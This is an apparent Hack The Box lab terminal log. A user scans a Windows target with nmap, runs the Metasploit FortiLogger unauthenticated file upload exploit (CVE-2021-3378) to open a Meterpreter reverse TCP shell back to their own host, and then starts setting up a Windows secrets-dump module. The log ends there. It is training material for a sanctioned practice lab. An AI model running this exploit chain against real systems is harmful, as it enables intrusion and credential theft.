+   198  payload/windows/vncinject/reverse_http                      .                normal  No     VNC Server (Reflective Injection), Windows Reverse HTTP Stager (wininet)
+   199  payload/windows/vncinject/reverse_http_proxy_pstore         .                normal  No     VNC Server (Reflective Injection), Reverse HTTP Stager Proxy
+   200  payload/windows/vncinject/reverse_ipv6_tcp                  .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (IPv6)
+   201  payload/windows/vncinject/reverse_nonx_tcp                  .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (No NX or Win7)
+   202  payload/windows/vncinject/reverse_ord_tcp                   .                normal  No     VNC Server (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+   203  payload/windows/vncinject/reverse_tcp                       .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager
+   204  payload/windows/vncinject/reverse_tcp_allports              .                normal  No     VNC Server (Reflective Injection), Reverse All-Port TCP Stager
+   205  payload/windows/vncinject/reverse_tcp_dns                   .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (DNS)
+   206  payload/windows/vncinject/reverse_tcp_rc4                   .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   207  payload/windows/vncinject/reverse_tcp_rc4_dns               .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   208  payload/windows/vncinject/reverse_tcp_uuid                  .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support
+   209  payload/windows/vncinject/reverse_winhttp                   .                normal  No     VNC Server (Reflective Injection), Windows Reverse HTTP Stager (winhttp)
+
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> payloads
+[-] Unknown command: payloads. Run the help command for more details.
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> info
+
+       Name: Apache Win32 Chunked Encoding
+     Module: exploit/windows/http/apache_chunked
+   Platform: Windows
+       Arch: 
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Good
+  Disclosed: 2002-06-19
+
+Provided by:
+  hdm <x@hdm.io>
+  jduck <jduck@metasploit.com>
+
+Module side effects:
+ unknown-side-effects
+
+Module stability:
+ unknown-stability
+
+Module reliability:
+ unknown-reliability
+
+Available targets:
+      Id  Name
+      --  ----
+      0   Windows Generic Bruteforce
+      1   Apache.org Build 1.3.9->1.3.19
+      2   Apache.org Build 1.3.22->1.3.24
+      3   Apache.org Build 1.3.19->1.3.24
+      4   Apache.org Build 1.3.22
+      5   Apache.org Build 1.3.17->1.3.24 (Windows 2000)
+      6   Apache.org Build 1.3.17->1.3.24 (Windows NT)
+  =>  7   Windows 2003 English SP0
+      8   Windows 2000 English
+      9   Oracle 8.1.7 Apache 1.3.12
+      10  Oracle 9.1.0 Apache 1.3.12
+      11  Oracle 9.2.0 Apache 1.3.22
+      12  Debugging Target
+
+Check supported:
+  Yes
+
+Basic options:
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, socks5, socks5h
+  RHOSTS   10.129.1.11      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT    80               yes       The target port (TCP)
+  SSL      false            no        Negotiate SSL/TLS for outgoing connections
+  VHOST                     no        HTTP server virtual host
+
+Payload information:
+  Space: 987
+  Avoid: 8 characters
+
+Description:
+  This module exploits the chunked transfer integer wrap
+  vulnerability in Apache version 1.2.x to 1.3.24. This
+  particular module has been tested with all versions of the
+  official Win32 build between 1.3.9 and 1.3.24. Additionally,
+  it should work against most co-branded and bundled versions
+  of Apache (Oracle 8i, 9i, IBM HTTPD, etc).
+
+  You will need to use the Check() functionality to determine
+  the exact target version prior to launching the exploit. The
+  version of Apache bundled with Oracle 8.1.7 will not
+  automatically restart, so if you use the wrong target value,
+  the server will crash.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2002-0392
+  OSVDB (838)
+  http://www.securityfocus.com/bid/5033
+
+
+View the full module info with the info -d command.
+
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> 
+[1]+  Stopped                 msfconsole -q
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-4yleykfxye]─[~]
+└──╼ [★]$ bg
+[1]+ msfconsole -q &
+
+[1]+  Stopped                 msfconsole -q
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-4yleykfxye]─[~]
+└──╼ [★]$ sudo nmap -sV -sS -p- --script=/usr/share/nmap/scripts/vulners.nse 10.129.1.11
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-27 19:15 EDT
+Nmap scan report for 10.129.1.11
+Host is up (0.0082s latency).
+Not shown: 65520 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+5000/tcp  open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 69.05 seconds
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-4yleykfxye]─[~]
+└──╼ [★]$ fg
+msfconsole -q
+
+
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> search Microsoft-IIS/10.0
+[-] No results from search
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> search Microsoft-IIS
+
+Matching Modules
+================
+
+   #  Name                                          Disclosure Date  Rank    Check  Description
+   -  ----                                          ---------------  ----    -----  -----------
+   0  auxiliary/scanner/http/iis_shortname_scanner  .                normal  Yes    Microsoft IIS shortname vulnerability scanner
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/iis_shortname_scanner
+
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> db_nmap
+[-] Database not connected
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> Interrupt: use the 'exit' command to quit
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> exit
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-4yleykfxye]─[~]
+└──╼ [★]$ msf6
+bash: msf6: command not found
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-4yleykfxye]─[~]
+└──╼ [★]$ db_nmap
+bash: db_nmap: command not found
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-4yleykfxye]─[~]
+└──╼ [★]$ msf
+msfconsole             msf-egghunter          msf-halflm_second      msf-makeiplist         msf-nasm_shell         msfrpc                 msfupdate              
+msfconsole-start       msf-exe2vba            msf-hmac_sha1_crack    msf-md5_lookup         msf-pattern_create     msfrpcd                msfvenom               
+msfd                   msf-exe2vbs            msf-java_deserializer  msf-metasm_shell       msf-pattern_offset     msfstart               msf-virustotal         
+msfdb                  msf-find_badchars      msf-jsobfu             msf-msf_irb_shell      msf-pdf2xdp            msfstop                
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-4yleykfxye]─[~]
+└──╼ [★]$ msf
+msfconsole             msf-egghunter          msf-halflm_second      msf-makeiplist         msf-nasm_shell         msfrpc                 msfupdate              
+msfconsole-start       msf-exe2vba            msf-hmac_sha1_crack    msf-md5_lookup         msf-pattern_create     msfrpcd                msfvenom               
+msfd                   msf-exe2vbs            msf-java_deserializer  msf-metasm_shell       msf-pattern_offset     msfstart               msf-virustotal         
+msfdb                  msf-find_badchars      msf-jsobfu             msf-msf_irb_shell      msf-pdf2xdp            msfstop                
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-4yleykfxye]─[~]
+└──╼ [★]$ msfconsole -q
+[msf](Jobs:0 Agents:0) >> msfstart
+[*] exec: msfstart
+
+[i] Database already started
+[+] Creating database user 'msf'
+[+] Creating databases 'msf'
+       ▄▄▄▄
+   ▄▄▀▀    ▀▀▄▄
+ ▄▀            ▀▄
+ █▀▄▄        ▄▄▀█  █   █   ██   ▄█▀█▄ ▐█ ▄█▌ ▀█▀ █  █ █▀▀ ▐█▀▀▄   ▄██▄   █▄  ▄█
+ █   ▀█▄▄▄▄█▀   █  █▄▄▄█  █  █  █   ▀ ▐██▀    █  █▄▄█ █▄▄ ▐█▄▄█ ▐█▀  ▀█▌  ▀██▀
+ █      ▐▌      █  █▀▀▀█  ████  █   ▄ ▐██▄    █  █  █ █   ▐█▀▀█ ▐█▄  ▄█▌  ▄██▄
+ ▀▄     ▐▌     ▄▀  █   █ ▐█  █▌ ▀█▄█▀ ▐█ ▀█▌  █  █  █ █▄▄ ▐█▄▄▀   ▀██▀   █▀  ▀█
+   ▀▀▄▄ ▐▌ ▄▄▀▀
+       ▀▀▀▀
+ 
+Welcome to your Parrot Linux desktop!
+
+Internet access is enabled for paid users subject to the following:
+1. This instance is not meant to perform real assessments or interact with any live targets.
+2. Pentesting any target (with or without consent) outside of HTB labs is prohibited.
+
+Free users are limited to our own targets, and GitHub.
+
+Remember! Do not store any personal or sensitive information in this box!
+Its only purpose is to allow you to play in our labs.
+
+Feel free to install any tools you prefer. 
+You have a small amount of persistent storage in ~/my_data.
+You can also add persistent customizations via ~/my_data/user_init file, which gets executed on startup!
+
+While ~/my_data will persist, we cannot guarantee its availability, nor do we back it up! 
+We cannot recover this data if it is lost! Do not store anything critical or sensitive here.
+
+Note that once this instance is terminated, all data not in ~/my_data, including tools you installed, will be lost! 
+
+PS: You have sudo :)
+[+] Creating databases 'msf_test'
+       ▄▄▄▄
+   ▄▄▀▀    ▀▀▄▄
+ ▄▀            ▀▄
+ █▀▄▄        ▄▄▀█  █   █   ██   ▄█▀█▄ ▐█ ▄█▌ ▀█▀ █  █ █▀▀ ▐█▀▀▄   ▄██▄   █▄  ▄█
+ █   ▀█▄▄▄▄█▀   █  █▄▄▄█  █  █  █   ▀ ▐██▀    █  █▄▄█ █▄▄ ▐█▄▄█ ▐█▀  ▀█▌  ▀██▀
+ █      ▐▌      █  █▀▀▀█  ████  █   ▄ ▐██▄    █  █  █ █   ▐█▀▀█ ▐█▄  ▄█▌  ▄██▄
+ ▀▄     ▐▌     ▄▀  █   █ ▐█  █▌ ▀█▄█▀ ▐█ ▀█▌  █  █  █ █▄▄ ▐█▄▄▀   ▀██▀   █▀  ▀█
+   ▀▀▄▄ ▐▌ ▄▄▀▀
+       ▀▀▀▀
+ 
+Welcome to your Parrot Linux desktop!
+
+Internet access is enabled for paid users subject to the following:
+1. This instance is not meant to perform real assessments or interact with any live targets.
+2. Pentesting any target (with or without consent) outside of HTB labs is prohibited.
+
+Free users are limited to our own targets, and GitHub.
+
+Remember! Do not store any personal or sensitive information in this box!
+Its only purpose is to allow you to play in our labs.
+
+Feel free to install any tools you prefer. 
+You have a small amount of persistent storage in ~/my_data.
+You can also add persistent customizations via ~/my_data/user_init file, which gets executed on startup!
+
+While ~/my_data will persist, we cannot guarantee its availability, nor do we back it up! 
+We cannot recover this data if it is lost! Do not store anything critical or sensitive here.
+
+Note that once this instance is terminated, all data not in ~/my_data, including tools you installed, will be lost! 
+
+PS: You have sudo :)
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+[+] Creating initial database schema
+[i] Database already started
+[*] Initializing msfd...
+[*] Running msfd...
+[msf](Jobs:0 Agents:0) >> db_nmap Microsoft-IIS/10.0
+[-] Database not connected
+[msf](Jobs:0 Agents:0) >> db_nmap Microsoft-IIS/10.0
+[-] Database not connected
+[msf](Jobs:0 Agents:0) >> db_nmap Microsoft-IIS/10.0
+[-] Database not connected
+[msf](Jobs:0 Agents:0) >> Microsoft-IIS/10.0
+[-] Unknown command: Microsoft-IIS/10.0. Run the help command for more details.
+[msf](Jobs:0 Agents:0) >> db_nmap -sV -p- -T5 -A Microsoft-IIS/10.0
+[-] Database not connected
+[msf](Jobs:0 Agents:0) >> db_nmap -sV -p- -T5 -A 10.129.1.11
+[-] Database not connected
+[msf](Jobs:0 Agents:0) >> msfconnect
+[-] Unknown command: msfconnect. Did you mean connect? Run the help command for more details.
+[msf](Jobs:0 Agents:0) >> connect
+Usage: connect [options] <host> <port>
+
+Communicate with a host, similar to interacting via netcat, taking advantage of
+any configured session pivoting.
+
+OPTIONS:
+
+    -c, --comm <comm>               Specify which Comm to use.
+    -C, --crlf                      Try to use CRLF for EOL sequence.
+    -h, --help                      Help banner.
+    -i, --send-contents <file>      Send the contents of a file.
+    -p, --proxies <proxies>         List of proxies to use.
+    -P, --source-port <port>        Specify source port.
+    -S, --source-address <address>  Specify source address.
+    -s, --ssl                       Connect with SSL.
+    -u, --udp                       Switch to a UDP socket.
+    -w, --timeout <seconds>         Specify connect timeout.
+    -z, --try-connection            Just try to connect, then return.
+[msf](Jobs:0 Agents:0) >> nmap -sV -p- -T5 -A 10.129.1.11
+[*] exec: nmap -sV -p- -T5 -A 10.129.1.11
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-27 19:23 EDT
+Nmap scan report for 10.129.1.11
+Host is up (0.0074s latency).
+Not shown: 65520 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2026-05-27T23:25:04+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: WIN-51BJ97BCIPV
+|   NetBIOS_Domain_Name: WIN-51BJ97BCIPV
+|   NetBIOS_Computer_Name: WIN-51BJ97BCIPV
+|   DNS_Domain_Name: WIN-51BJ97BCIPV
+|   DNS_Computer_Name: WIN-51BJ97BCIPV
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-05-27T23:24:56+00:00
+| ssl-cert: Subject: commonName=WIN-51BJ97BCIPV
+| Not valid before: 2026-05-26T22:44:12
+|_Not valid after:  2026-11-25T22:44:12
+5000/tcp  open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: FortiLogger | Log and Report System
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-05-27T23:24:58
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 72.97 seconds
+[msf](Jobs:0 Agents:0) >> 
+[1]+  Stopped                 msfconsole -q
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-4yleykfxye]─[~]
+└──╼ [★]$ bg
+[1]+ msfconsole -q &
+
+[1]+  Stopped                 msfconsole -q
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-4yleykfxye]─[~]
+└──╼ [★]$ searchsploit FortiLogger
+------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                                              |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+FortiLogger 4.4.2.2 - Unauthenticated Arbitrary File Upload (Metasploit)                                                                                    | multiple/webapps/49600.rb
+------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-4yleykfxye]─[~]
+└──╼ [★]$ fg
+msfconsole -q
+search fortilogger
+search fortilogger
+
+Matching Modules
+================
+
+   #  Name                                                   Disclosure Date  Rank    Check  Description
+   -  ----                                                   ---------------  ----    -----  -----------
+   0  exploit/windows/http/fortilogger_arbitrary_fileupload  2021-02-26       normal  Yes    FortiLogger Arbitrary File Upload Exploit
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/fortilogger_arbitrary_fileupload
+
+[msf](Jobs:0 Agents:0) >> use 0
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(windows/http/fortilogger_arbitrary_fileupload) >> info
+
+       Name: FortiLogger Arbitrary File Upload Exploit
+     Module: exploit/windows/http/fortilogger_arbitrary_fileupload
+   Platform: Windows
+       Arch: x86, x64
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+  Disclosed: 2021-02-26
+
+Provided by:
+  Berkan Er <b3rsec@protonmail.com>
+
+Module side effects:
+ artifacts-on-disk
+ ioc-in-logs
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ unreliable-session
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   FortiLogger < 5.2.0
+
+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, socks5, socks5h
+  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT      5000             yes       The target port (TCP)
+  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI  /                yes       The base path to the FortiLogger
+  VHOST                       no        HTTP server virtual host
+
+Payload information:
+
+Description:
+  This module exploits an unauthenticated arbitrary file upload
+  via insecure POST request. It has been tested on versions < 5.2.0 in
+  Windows 10 Enterprise.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2021-3378
+  https://erberkan.github.io/2021/cve-2021-3378/
+
+
+View the full module info with the info -d command.
+
+[msf](Jobs:0 Agents:0) exploit(windows/http/fortilogger_arbitrary_fileupload) >> set RHOST 10.129.1.11
+RHOST => 10.129.1.11
+[msf](Jobs:0 Agents:0) exploit(windows/http/fortilogger_arbitrary_fileupload) >> set LHOST 10.10.14.4
+LHOST => 10.10.14.4
+[msf](Jobs:0 Agents:0) exploit(windows/http/fortilogger_arbitrary_fileupload) >> info
+
+       Name: FortiLogger Arbitrary File Upload Exploit
+     Module: exploit/windows/http/fortilogger_arbitrary_fileupload
+   Platform: Windows
+       Arch: x86, x64
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+  Disclosed: 2021-02-26
+
+Provided by:
+  Berkan Er <b3rsec@protonmail.com>
+
+Module side effects:
+ artifacts-on-disk
+ ioc-in-logs
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ unreliable-session
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   FortiLogger < 5.2.0
+
+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, socks5, socks5h
+  RHOSTS     10.129.1.11      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT      5000             yes       The target port (TCP)
+  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI  /                yes       The base path to the FortiLogger
+  VHOST                       no        HTTP server virtual host
+
+Payload information:
+
+Description:
+  This module exploits an unauthenticated arbitrary file upload
+  via insecure POST request. It has been tested on versions < 5.2.0 in
+  Windows 10 Enterprise.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2021-3378
+  https://erberkan.github.io/2021/cve-2021-3378/
+
+
+View the full module info with the info -d command.
+
+[msf](Jobs:0 Agents:0) exploit(windows/http/fortilogger_arbitrary_fileupload) >> run
+[*] Started reverse TCP handler on 10.10.14.4:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable. FortiLogger version 4.4.2.2
+[+] Generate Payload
+[+] Payload has been uploaded
+[*] Executing payload...
+[*] Sending stage (190534 bytes) to 10.129.1.11
+[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.129.1.11:49694) at 2026-05-27 19:27:24 -0400
+
+(Meterpreter 1)(C:\Windows\system32) > 
+Background session 1? [y/N]  y
+[-] Unknown command: y. Run the help command for more details.
+[msf](Jobs:0 Agents:1) exploit(windows/http/fortilogger_arbitrary_fileupload) >> search ntlm
+
+Matching Modules
+================
+
+   #   Name                                                         Disclosure Date  Rank       Check  Description
+   -   ----                                                         ---------------  ----       -----  -----------
+   0   auxiliary/admin/dcerpc/cve_2022_26923_certifried             .                normal     No     Active Directory Certificate Services (ADCS) privilege escalation (Certifried)
+   1     \_ action: AUTHENTICATE                                    .                .          .      Same as REQUEST_CERT but also authenticate
+   2     \_ action: PRIVESC                                         .                .          .      Full privilege escalation attack
+   3     \_ action: REQUEST_CERT                                    .                .          .      Request a certificate with DNS host name matching the DC
+   4   auxiliary/server/capture/mssql                               .                normal     No     Authentication Capture: MSSQL
+   5   auxiliary/server/capture/smb                                 .                normal     No     Authentication Capture: SMB
+   6   auxiliary/fileformat/badpdf                                  .                normal     No     BADPDF Malicious PDF Creator
+   7   exploit/unix/webapp/citrix_access_gateway_exec               2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
+   8   auxiliary/gather/crushftp_fileread_cve_2024_4040             .                normal     Yes    CrushFTP Unauthenticated Arbitrary File Read
+   9   auxiliary/admin/dcerpc/esc_update_ldap_object                .                normal     No     Exploits AD CS Template misconfigurations which involve updating an LDAP object: ESC9, ESC10, and ESC16
+   10    \_ AKA: ESC9                                               .                .          .      .
+   11    \_ AKA: ESC10                                              .                .          .      .
+   12    \_ AKA: ESC16                                              .                .          .      .
+   13  auxiliary/gather/kerberoast                                  .                normal     No     Gather Ticket Granting Service (TGS) tickets for User Service Principal Names (SPN)
+   14    \_ AKA: GetUserSpns.py                                     .                .          .      .
+   15    \_ AKA: get_user_spns                                      .                .          .      .
+   16  auxiliary/server/capture/http_ntlm                           .                normal     No     HTTP Client MS Credential Catcher
+   17  auxiliary/server/http_ntlmrelay                              .                normal     No     HTTP Client MS Credential Relayer
+   18  auxiliary/scanner/http/ntlm_info_enumeration                 .                normal     No     Host Information Enumeration via NTLM Authentication
+   19  auxiliary/fileformat/icon_environment_datablock_leak         2025-05-16       normal     No     IconEnvironmentDataBlock - Windows LNK File Special UNC Path NTLM Leak
+   20  auxiliary/admin/kerberos/get_ticket                          .                normal     No     Kerberos TGT/TGS Ticket Requester
+   21    \_ action: GET_HASH                                        .                .          .      Request a TGS to recover the NTLM hash
+   22    \_ action: GET_TGS                                         .                .          .      Request a Ticket-Granting-Service (TGS)
+   23    \_ action: GET_TGT                                         .                .          .      Request a Ticket-Granting-Ticket (TGT)
+   24    \_ AKA: getTGT                                             .                .          .      .
+   25    \_ AKA: getST                                              .                .          .      .
+   26  auxiliary/scanner/http/dir_webdav_unicode_bypass             .                normal     No     MS09-020 IIS6 WebDAV Unicode Auth Bypass Directory Scanner
+   27  auxiliary/scanner/http/ms09_020_webdav_unicode_bypass        .                normal     No     MS09-020 IIS6 WebDAV Unicode Authentication Bypass
+   28  auxiliary/scanner/http/exchange_web_server_pushsubscription  2019-01-21       normal     No     Microsoft Exchange Privilege Escalation Exploit
+   29  auxiliary/admin/mssql/mssql_ntlm_stealer                     .                normal     No     Microsoft SQL Server NTLM Stealer
+   30  auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                .                normal     No     Microsoft SQL Server SQLi NTLM Stealer
+   31  auxiliary/server/relay/smb_to_ldap                           .                normal     No     Microsoft Windows SMB to LDAP Relay
+   32  auxiliary/server/relay/smb_to_mssql                          .                normal     No     Microsoft Windows SMB to MSSQL Relay
+   33  auxiliary/fileformat/word_unc_injector                       .                normal     No     Microsoft Word UNC Path Injector
+   34  auxiliary/spoof/nbns/nbns_response                           .                normal     No     NetBIOS Name Service Spoofer
+   35  auxiliary/scanner/http/owa_ews_login                         .                normal     No     OWA Exchange Web Services (EWS) Login Scanner
+   36  auxiliary/admin/oracle/ora_ntlm_stealer                      2009-04-07       normal     No     Oracle SMB Relay Code Execution
+   37  auxiliary/analyze/crack_windows                              .                normal     No     Password Cracker: Windows
+   38    \_ action: auto                                            .                .          .      Auto-selection of cracker
+   39    \_ action: hashcat                                         .                .          .      Use Hashcat
+   40    \_ action: john                                            .                .          .      Use John the Ripper
+   41  auxiliary/fileformat/environment_variable_datablock_leak     2025-05-06       normal     No     Right-Click Execution - Windows LNK File Special UNC Path NTLM Leak
+   42  auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt                .                normal     No     SMB NTLMv1 Login Request Corruption
+   43  auxiliary/admin/smb/change_password                          .                normal     No     SMB Password Change
+   44    \_ action: CHANGE                                          .                .          .      Change the password, knowing the existing one. New AES kerberos keys will be generated.
+   45    \_ action: CHANGE_NTLM                                     .                .          .      Change the password to a NTLM hash value, knowing the existing password. AES kerberos authentication will not work until a standard password change occurs.
+   46    \_ action: RESET                                           .                .          .      Reset the target's password without knowing the existing one (requires appropriate permissions). New AES kerberos keys will be generated.
+   47    \_ action: RESET_NTLM                                      .                .          .      Reset the target's NTLM hash, without knowing the existing password. AES kerberos authentication will not work until a standard password change occurs.
+   48  auxiliary/scanner/smtp/smtp_ntlm_domain                      .                normal     No     SMTP NTLM Domain Extraction
+   49  exploit/windows/local/bits_ntlm_token_impersonation          2019-12-06       great      Yes    SYSTEM token impersonation through NTLM bits authentication on missing WinRM Service.
+   50  auxiliary/fileformat/specialfolder_leak                      2025-05-10       normal     No     SpecialFolderDatablock - Windows LNK File Special UNC Path NTLM Leak
+   51  exploit/linux/proxy/squid_ntlm_authenticate                  2004-06-08       great      No     Squid NTLM Authenticate Overflow
+   52  auxiliary/scanner/winrm/winrm_login                          .                normal     No     WinRM Login Utility
+   53  auxiliary/scanner/winrm/winrm_wql                            .                normal     No     WinRM WQL Query Runner
+   54  post/windows/escalate/golden_ticket                          .                normal     No     Windows Escalate Golden Ticket
+   55  post/windows/gather/word_unc_injector                        .                normal     No     Windows Gather Microsoft Office Word UNC Path Injector
+   56  exploit/windows/local/ms16_075_reflection                    2016-01-16       normal     Yes    Windows Net-NTLMv2 Reflection DCOM/RPC
+   57    \_ target: Automatic                                       .                .          .      .
+   58    \_ target: Windows x86                                     .                .          .      .
+   59    \_ target: Windows x64                                     .                .          .      .
+   60  exploit/windows/local/ms16_075_reflection_juicy              2016-01-16       great      Yes    Windows Net-NTLMv2 Reflection DCOM/RPC (Juicy)
+   61  post/windows/gather/netlm_downgrade                          .                normal     No     Windows NetLM Downgrade Attack
+   62  auxiliary/fileformat/multidrop                               .                normal     No     Windows SMB Multi Dropper
+   63  auxiliary/gather/windows_secrets_dump                        .                normal     No     Windows Secrets Dump
+   64    \_ action: ALL                                             .                .          .      Dump everything
+   65    \_ action: CACHE                                           .                .          .      Dump cached hashes
+   66    \_ action: DOMAIN                                          .                .          .      Dump domain secrets (credentials, password history, Kerberos keys, etc.)
+   67    \_ action: LSA                                             .                .          .      Dump LSA secrets
+   68    \_ action: SAM                                             .                .          .      Dump SAM hashes
+
+
+Interact with a module by name or index. For example info 68, use 68 or use auxiliary/gather/windows_secrets_dump
+After interacting with a module you can manually set a ACTION with set ACTION 'SAM'
+
+[msf](Jobs:0 Agents:1) exploit(windows/http/fortilogger_arbitrary_fileupload) >> use 63
+[*] Setting default action ALL - view all 5 actions with the show actions command
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[msf](Jobs:0 Agents:1) auxiliary(gather/windows_secrets_dump) >> set SESSION 1
+SESSION => 1
+[msf](Jobs:0 Agents:1) auxiliary(gather/windows_secrets_dump) >> run
+[-] 10.129.1.11:49694 - Msf::OptionValidateError The following options failed to validate:
+[-] 10.129.1.11:49694 - Invalid option SESSION: Incompatible session type: meterpreter. This module works with: smb.
+[msf](Jobs:0 Agents:1) auxiliary(gather/windows_secrets_dump) >> info
+
+       Name: Windows Secrets Dump
+     Module: auxiliary/gather/windows_secrets_dump
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+Provided by:
+  Alberto Solino
+  Christophe De La Fuente
+  antuache
+  smashery
+
+Module side effects:
+ ioc-in-logs
+
+Available actions:
